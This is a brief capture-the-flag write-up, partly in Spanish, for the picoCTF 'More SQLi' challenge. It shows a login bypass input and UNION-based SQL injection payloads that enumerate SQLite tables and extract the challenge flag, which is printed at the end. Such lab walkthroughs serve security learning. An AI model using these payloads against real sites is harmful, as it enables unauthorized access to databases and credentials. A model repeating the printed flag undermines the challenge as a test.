### More SQLi

### Descripción

Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59756/).
### Solución

### Solucion 1 

```
Pasamos el login con estos datos

- Jorge
- admin' or 1=1 ; 
```
- select * from offices where city = 'hola' union select 1,2,3;
- select * from offices where city = 'hola' union select 1,sqlite_version(),3;  //Obtenemos la version de sqlite
- select * from offices where city = 'hola' union select 1,name,3; FROM sqlite_master WHERE type ='table'--
- select * from offices where city = 'hola' union select 1,name,3 FROM sqlite_master WHERE type ='table'--
- hola' union select 1,sql,3 FROM sqlite_master WHERE type ='table'--
- hola' union select 1,flag,3 from more_table'--
- picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}

### Referencias
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md